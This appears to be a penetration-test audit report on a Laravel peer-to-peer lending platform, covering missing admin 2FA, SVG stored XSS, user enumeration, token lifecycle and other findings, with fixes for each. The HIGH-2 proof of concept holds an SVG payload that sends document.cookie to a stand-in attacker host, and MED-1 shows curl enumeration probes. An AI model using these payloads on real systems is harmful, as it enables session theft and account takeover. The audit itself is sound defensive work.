# Security Audit + Penetration Test — Phase 1 (Static Analysis)

**Project:** P2P Lending Platform
**Stack:** Laravel 13.2 · Sanctum 4 · Filament 5.4 · Vue 3 · MySQL · PHP 8.3
**Environment audited:** local (`APP_ENV=local`, `APP_DEBUG=false`, `https://p2p-lending.test`)
**Methodology:** Code review of every controller, service, model, policy, migration, middleware, FormRequest, Filament resource, and Vue/Blade template.
**Date:** 2026-04-16

---

## Executive Summary

The codebase is **above-average for a fintech of this size**. The financial layer (`WalletService`, `InvestmentService`, `RepaymentService`, `WithdrawalService`, `AmortizationService`) is well-architected: bcmath everywhere, `lockForUpdate()` + `DB::transaction()` on every money-moving operation, idempotency keys on investments, immutable transactions enforced at both PHP and DB-trigger level, CHECK constraints preventing negative balances, encrypted PII at rest, scoped queries on every list endpoint. Mass-assignment is properly defended (`role` and `kyc_status` deliberately not in `$fillable`). Policies match controllers.

However, **8 issues** require attention before production. Of these, **0 CRITICAL**, **2 HIGH**, **4 MEDIUM**, and the rest LOW/INFO.

The two HIGH issues are:
1. **No 2FA for admin Filament panel** — single password protects the wallet of every investor.
2. **SVG accepted as KYC document** — `image` validation rule allows SVG, which can carry JavaScript and fire when admin views the document.

No CRITICAL findings during static review (no SQLi, no auth bypass, no RCE, no obvious financial manipulation paths). CRITICAL classification will be revisited during Phase B (active testing).

---

## Severity counts (Static phase)

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 2 |
| MEDIUM | 4 |
| LOW | 5 |
| INFO | 3 |

---

## HIGH

### [HIGH-1] No 2FA / MFA on Filament admin panel
- **Type:** Static
- **Category:** Authentication
- **File:** [app/Providers/Filament/AdminPanelProvider.php:54](app/Providers/Filament/AdminPanelProvider.php:54), [app/Models/User.php:51](app/Models/User.php:51)
- **Description:** Filament's admin panel (`/admin`) is protected only by `Authenticate` middleware. There is no second factor (TOTP, WebAuthn, SMS, email OTP) on the admin login. Admin role is granted on `role === 'admin'` and the panel exposes:
  - Approving deposits (credits user wallets)
  - Approving withdrawals (sends real money out)
  - Posting repayments (distributes money to investors)
  - Viewing every borrower's full PII (decrypted on read via the `encrypted` cast)
  - KYC approval (regulatory authorisation)
- **Impact:** A single phishing/credential-stuffing/leaked-password incident → adversary can drain user wallets via fraudulent deposits + withdrawals to attacker-controlled IBANs, alter borrower PII, approve fraudulent KYC, and decrypt every PII record.
- **Proof of Concept:** No PoC needed — this is an architectural gap. Will demonstrate end-to-end takeover in Phase B with: `curl -c jar /admin/login` → POST credentials → access any admin URL.
- **Recommendation:** Mandatory TOTP for any user with `role=admin`. Filament has community plugins (`stephenjude/filament-two-factor-authentication`, `jeffgreco13/filament-breezy`) or roll a Laravel Fortify 2FA flow. Block admin panel access until TOTP is set on first login.
- **Priority:** Immediate

### [HIGH-2] SVG files accepted as KYC documents → stored XSS against admin
- **Type:** Static
- **Category:** File Upload / XSS
- **File:** [app/Http/Controllers/Api/ProfileController.php:43-44](app/Http/Controllers/Api/ProfileController.php:43), [routes/web.php:7-30](routes/web.php:7), [resources/views/filament/components/kyc-image.blade.php:2](resources/views/filament/components/kyc-image.blade.php:2)
- **Description:** `submitKyc` validates uploads with `['required', 'image', 'max:10240']`. Laravel's `image` validation rule **includes SVG** (jpg, jpeg, png, gif, bmp, svg, webp). The file is then served back through `routes/web.php` via `response()->file($resolvedPath)` — Laravel will set the `Content-Type` to `image/svg+xml`, and the Filament admin view renders it inside an `<img src="…">`. Most browsers do not execute `<script>` inside SVG referenced via `<img>`, but if the admin opens the URL directly (or a future template uses `<object>`/`<embed>`/`<iframe>`), embedded JavaScript executes in the admin origin — full session takeover, leading to HIGH-1 outcomes.
- **Impact:** Admin session takeover, indirect privilege escalation, all of HIGH-1's blast radius via a single uploaded file. Even without direct script execution, SVG can carry phishing UI content displayed inside the admin panel.
- **Proof of Concept (will be executed in Phase B):**
  ```bash
  cat > /tmp/xss.svg <<'EOF'
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/x?c='+document.cookie)">
    <script>alert('XSS as '+document.domain)</script>
  </svg>
  EOF
  curl -X POST https://p2p-lending.test/api/profile/kyc \
    -H "Cookie: ${SESSION_COOKIE}" -H "X-XSRF-TOKEN: ${XSRF}" \
    -F "document=@/tmp/xss.svg"
  ```
  Then admin opens `/admin/kyc-document/{path}` directly.
- **Recommendation:**
  - Restrict the rule to `mimes:jpg,jpeg,png,webp` (or `image` minus SVG). Better: `mimes:jpg,jpeg,png,pdf` and validate magic bytes server-side.
  - Re-encode uploaded images server-side via Intervention Image (defangs polyglot files).
  - When serving via `response()->file`, force `Content-Disposition: attachment` for any non-image-rendered viewer; for the inline admin viewer, force `Content-Type: image/png` after re-encoding.
  - Add `Content-Security-Policy` to admin responses (`script-src 'self'`).
- **Priority:** Immediate

---

## MEDIUM

### [MED-1] Username enumeration via password-reset endpoint
- **Type:** Static
- **Category:** Authentication / Information Disclosure
- **File:** [app/Http/Controllers/Api/AuthController.php:106-121](app/Http/Controllers/Api/AuthController.php:106)
- **Description:** `forgotPassword` throws `ValidationException` when `Password::sendResetLink` returns `INVALID_USER`. The translated message differs between "link sent" and "no such user" — observable by attacker. Login throttle uses `email|ip` key; combined with reset-endpoint enumeration an attacker can validate which emails exist before brute-forcing.
- **Impact:** User enumeration → targeted phishing, credential stuffing focused on real accounts, bypassing the "spray broadly" defence.
- **Proof of Concept:**
  ```bash
  curl -X POST https://p2p-lending.test/api/forgot-password -d 'email=real@test.com'
  # → 200 "We have emailed your password reset link."
  curl -X POST https://p2p-lending.test/api/forgot-password -d 'email=fake@test.com'
  # → 422 "We can't find a user with that email address."
  ```
- **Recommendation:** Always return a generic 200 success ("If the email is registered you will receive a reset link.") regardless of `Password::sendResetLink` outcome. Same for `/login` (already partially uniform via `auth.failed`, verify under timing).
- **Priority:** Next release

### [MED-2] IBAN format validated but checksum (mod-97) not verified
- **Type:** Static
- **Category:** Input Validation
- **File:** [app/Http/Requests/WithdrawalRequest.php:20](app/Http/Requests/WithdrawalRequest.php:20), [app/Http/Controllers/Api/ProfileController.php:82](app/Http/Controllers/Api/ProfileController.php:82)
- **Description:** Both withdrawal and saved-IBAN endpoints validate IBAN with `regex:/^[A-Z]{2}[0-9]{2}[A-Z0-9]{4,30}$/` only. There is no ISO 13616 mod-97 checksum verification, no length-by-country check (BG IBAN must be 22 characters), and no BIC check.
- **Impact:** A typo (or attacker spoofing) creates a withdrawal to a syntactically valid but mathematically invalid IBAN. The payment will be rejected at the SEPA layer, but only after admin approval — wasted operational effort, possible loss if intermediary rails partial-credit before rejection. Also enables withdrawals to deliberately malformed IBANs to obfuscate forensic trails.
- **Proof of Concept:** `BG00BANK1234567890123` passes the regex but fails mod-97.
- **Recommendation:** Use `php-iban` (intl extension provides `IntlChar`, but `Iban::isValid()` from a maintained package is cleaner). Validate per-country length: BG = 22.
- **Priority:** Next release

### [MED-3] Sanctum API tokens are never expired and not revoked on logout
- **Type:** Static
- **Category:** Token lifecycle
- **File:** [config/sanctum.php:50](config/sanctum.php:50), [app/Http/Controllers/Api/AuthController.php:87-99](app/Http/Controllers/Api/AuthController.php:87)
- **Description:** `'expiration' => null` means personal access tokens never expire. `logout()` calls `auth()->guard('web')->logout()` and invalidates the session, but does NOT call `$user->tokens()->delete()` or `$user->currentAccessToken()->delete()`. The current SPA flow uses cookie-based stateful auth, so this is dormant; but if any future surface uses Bearer tokens (mobile app, integrations), tokens leaked once are valid forever.
- **Impact:** Latent risk, becomes critical the moment Bearer tokens are introduced. A leaked token (browser cache, log file, repository commit) cannot be revoked except by manual DB intervention.
- **Recommendation:** Set `'expiration' => 60 * 24 * 7` (7 days) or shorter. In `logout()`, also call `$request->user()?->currentAccessToken()?->delete()` (no-op for stateful, real deletion for token-mode requests). Add an admin action to "Revoke all tokens" per user.
- **Priority:** Next release

### [MED-4] No `Content-Security-Policy` header
- **Type:** Static
- **Category:** Defense-in-depth / XSS
- **File:** [app/Http/Middleware/SecurityHeaders.php](app/Http/Middleware/SecurityHeaders.php)
- **Description:** `SecurityHeaders` middleware sets `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, and HSTS in production — but no CSP. CSP is the primary modern defense against XSS (limits script sources, blocks inline JS, blocks data: image/svg JavaScript). The HIGH-2 SVG XSS vector would be neutralised in admin pages with a strict `script-src 'self'`.
- **Impact:** Any future XSS bug becomes immediately exploitable without CSP backstop.
- **Recommendation:**
  ```
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{random}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'none';
    object-src 'none';
  ```
  Use a per-request nonce for Vue's inline styles/scripts. Note: Filament uses inline scripts/styles — start with `Content-Security-Policy-Report-Only` and tune.
- **Priority:** Next release

---

## LOW

### [LOW-1] `Borrower` model is not `Auditable`
- **Type:** Static
- **Category:** Audit / Compliance
- **File:** [app/Models/Borrower.php](app/Models/Borrower.php) (no `use Auditable;`)
- **Description:** Every other PII/financial model uses the `Auditable` trait (`User`, `Wallet`, `Transaction`, `Investment`, `Loan`). `Borrower` — which holds the most sensitive PII (encrypted `personal_id`, `full_name`, `address`, `phone`) — does not. Admin edits to borrower PII produce no audit log entry.
- **Impact:** Regulatory gap (GDPR Article 30 record-of-processing; AML investigations expect a complete audit trail of who-touched-what). Non-repudiation is broken if a rogue admin alters a borrower record.
- **Recommendation:** Add `use \App\Traits\Auditable;` to `Borrower`. Confirm `personal_id` stays in `Auditable::$sensitiveFields` redaction list (it already does).
- **Priority:** Next release

### [LOW-2] Email-verification SHA-1 fallback hash
- **Type:** Static
- **Category:** Authentication / Cryptography
- **File:** [routes/api.php:88-93](routes/api.php:88)
- **Description:** Email verification accepts either `hash_hmac('sha256', email, APP_KEY)` (new) **or** plain `sha1(email)` (legacy fallback). Plain `sha1(email)` is trivially computable from a known email — it is not a secret. The route is also wrapped in Laravel's `signed` middleware which validates an APP_KEY-HMAC signature on the URL, so an attacker cannot mint a valid URL without `APP_KEY`. The `sha1` fallback is therefore *currently* defense-in-depth nullified by the signature, but its presence is misleading and a reviewer might assume the hash provides security.
- **Impact:** None today (signed URL absorbs the risk). Becomes real if `signed` middleware is ever removed.
- **Recommendation:** Drop the `sha1` branch unless you can produce live links generated before the HMAC migration. Inline comment explaining why fallback exists, or an env flag that defaults off.
- **Priority:** Backlog

### [LOW-3] KYC upload allows storage spam (3/min × 10 MB → 1.8 GB/hour/user)
- **Type:** Static
- **Category:** Resource exhaustion
- **File:** [routes/api.php:58](routes/api.php:58), [app/Http/Controllers/Api/ProfileController.php:53-58](app/Http/Controllers/Api/ProfileController.php:53)
- **Description:** `/profile/kyc` is throttled at 3/min (good), but each upload stores a fresh file with a random name; the previous `kyc_document_path` is NOT deleted. A user with `kyc_status` in `submitted`/`rejected` can keep uploading. At 3 uploads/min × 10 MB × 60 min = **1.8 GB/hour per user**.
- **Impact:** Disk exhaustion → service outage. Cost amplification on object storage.
- **Recommendation:** Before storing the new file, delete the previous `kyc_document_path` if it exists. Reduce throttle to 3/hour. Reject if `kyc_status` is already `approved` (already done) or `submitted` (not done — should require admin to reject before resubmission).
- **Priority:** Backlog

### [LOW-4] Deposit reference codes are deterministic and predictable
- **Type:** Static
- **Category:** Information Disclosure / Business Logic
- **File:** [app/Http/Controllers/Api/DepositController.php:26](app/Http/Controllers/Api/DepositController.php:26)
- **Description:** `reference_code` shown to investor is `'P2P-' . str_pad($user->id, 6, '0', STR_PAD_LEFT)`. With user ID enumeration (e.g., from CSV-leaked subscriber list), every user's deposit reference is computable. The reference is what the admin uses to match incoming bank transfers to accounts.
- **Impact:** A malicious actor who controls a bank account or who can intercept the bank-side workflow could send a transfer with another user's reference code, and (depending on admin's matching procedure) the deposit could be credited to the wrong user. The admin's "match" step is the only barrier — and the `Захрани сметка` Filament action does not require the reference code on the backend, it just lets admin pick `user_id` directly.
- **Recommendation:** Generate a random 8-character alphanumeric token per `deposit_request` (also add unique constraint on the column — already present per migration). Rotate on each new deposit. Show on UI with copy button.
- **Priority:** Backlog

### [LOW-5] `Transaction` and `AuditLog` models lack PHP-level update/delete blockers
- **Type:** Static
- **Category:** Defense-in-depth / Compliance
- **File:** [app/Models/Transaction.php](app/Models/Transaction.php), [app/Models/AuditLog.php](app/Models/AuditLog.php)
- **Description:** DB triggers prevent UPDATE/DELETE on `transactions` (in MySQL only — see migration [2026_03_29_110003](database/migrations/2026_03_29_110003_add_transaction_immutability_triggers.php)). `AuditLog` has no DB trigger and no model-event blocker. `UPDATED_AT = null` only stops Eloquent from touching `updated_at`, it doesn't prevent updates. Tests run on SQLite, where the triggers are silently skipped, so a regression that calls `->update()` on a transaction would only surface in production.
- **Impact:** Compliance gap (auditor may flag absence of belt-and-braces immutability). Regression risk if test environment behaviour differs from production.
- **Recommendation:** Add `static::updating(fn() => throw new \LogicException(…))` and `static::deleting(...)` to both models. Add a feature test that asserts attempting to update a `Transaction` throws.
- **Priority:** Backlog

---

## INFO

### [INFO-1] No CSP, but no inline `eval()`/`new Function()` either
- Vue templates use compiled render functions, not runtime eval. `v-html` only used in 2 landing components ([HowItWorks.vue:42](resources/js/components/landing/HowItWorks.vue:42), [WhyUs.vue:46](resources/js/components/landing/WhyUs.vue:46)) on hardcoded SVG icons defined in the same file (not user-controlled). Safe.
- Mail templates `{!! !!}` usage is in vendor templates (`resources/views/vendor/mail/`) wrapping framework-provided content with `strip_tags`. Safe.
- Filament `formatStateUsing` callbacks all return plain strings (no `HtmlString`). Safe.

### [INFO-2] Excellent financial-layer hardening worth preserving
The following patterns are **above industry baseline** and should be maintained:
- bcmath used everywhere; floats only at JSON encode boundary (`number_format` to string).
- `lockForUpdate()` + `DB::transaction()` on every wallet write, plus on the loan row during `invest()` and the schedule row during repayment.
- DB triggers + CHECK constraints as last line of defence (`chk_wallets_*_non_negative`, `chk_loans_funded_amount_valid`, `prevent_transaction_update/delete`).
- Idempotency: `X-Idempotency-Key` header required on `/loans/{loan}/invest`, unique-constrained at DB level, race handled via `UniqueConstraintViolationException` catch.
- Withdrawals reserve funds at request time (prevents double-spend / invest-while-pending-withdrawal).
- Repayment distribution: last investor absorbs rounding remainder so sum is always exact.
- `Borrower` PII fields encrypted at rest (`encrypted` cast).
- Mass assignment locked down: `role`, `kyc_status` not in `$fillable`; `Wallet` only allows `user_id`; `UpdateProfileRequest` `only(['name','phone'])`.
- Config never reads `env()` outside `config/` (verified via grep). Cache-safe.
- `AccountDeletionService` is GDPR-compliant anonymisation with all the right balance/pending-request guards inside a transaction with locks.

### [INFO-3] Dependencies appear current
- Laravel 13.2.0, Sanctum 4.3, Filament 5.4.1, league/commonmark, symfony/* current, axios 1.15, vue 3.5, vite 8. No deprecated `laravel/ui` / `laravel/jetstream` 2FA stubs. No Telescope, Horizon, Debugbar, or Ignition in `composer.json`. Phase B will run `composer audit` and `npm audit` for live CVE comparison.

---

## Out-of-scope items observed (not findings — for awareness)

- Frontend token storage: SPA is cookie-stateful, tokens not in `localStorage`. ✅
- CORS: explicit allowlist via `APP_URL`, `supports_credentials: true`, no wildcard. ✅
- Session: encrypted (`SESSION_ENCRYPT=true`), JSON serialisation (no PHP gadget chain), `Secure`, `HttpOnly`, `SameSite=strict`. ✅
- KYC document path traversal: blocked by both `str_contains('..')` early reject AND `realpath()` containment check. ✅
- Notification IDOR: `$user->notifications()->where('id', $id)` correctly scoped. ✅
- IBAN displayed to user is masked (`maskedIban()`); audit log redacts `iban`/`personal_id`/`password`/`remember_token`. ✅
- Loan state machine enforced at model `booted()` level, with immutable-after-draft fields. ✅
- Filament `TransactionResource` and `AuditLogResource` are `canCreate() === false`, no edit/delete actions. ✅
- Forensic data captured: every transaction, deposit, withdrawal record stores `ip_address` + `user_agent`. ✅

---

## Phase B — proposed Active Tests (next phase)

Confirmed-relevant exploit attempts to run after this report is approved:

1. End-to-end PoC for HIGH-2 (SVG XSS upload → admin view).
2. Exploit MED-1 (forgot-password enumeration script).
3. Race condition battery on `/loans/{id}/invest` and `/withdrawal` (concurrent `curl` blast with shared idempotency key + without).
4. Mass-assignment brute force against `register` and `profile/update` (try injecting `role`, `kyc_status`, `wallet_id`, `wallet.available`).
5. IDOR sweep across `/portfolio`, `/transactions`, `/withdrawal/history`, `/profile/ibans/{id}`, `/notifications/{id}`.
6. Loan invest into non-fundable status (draft/repaid/late/default) — confirm 422 not 500.
7. Negative / zero / scientific-notation amounts on invest, withdraw, deposit-admin form.
8. Sanctum logout token persistence test.
9. SQLi probes on every filter parameter (`type`, `originator_id`, `risk_class`, `sort`, `date_from`, `date_to`).
10. Brute-force login throttle bypass (X-Forwarded-For, distributed emails).
11. Self-investment: borrower (data only — they're not users in this design, but verify the model can't be coerced).
12. Admin Filament `/admin/login` brute-force (no app-level throttle observed in `AdminPanelProvider`; Filament uses `livewire-rate-limiting` internally — verify).
13. CSRF: state-changing POST without `X-XSRF-TOKEN` from another origin.
14. Withdrawal IBAN swap mid-flow (TOCTOU).
15. Account-deletion bypass: try with `invested > 0`, with pending withdrawal, etc.

---

## Sign-off

Static phase complete. Awaiting approval to proceed with Phase B (active testing). Will create DB backup and the four test users (`admin`, `inv_a`, `inv_b`, plus a borrower data fixture) before any active probe.
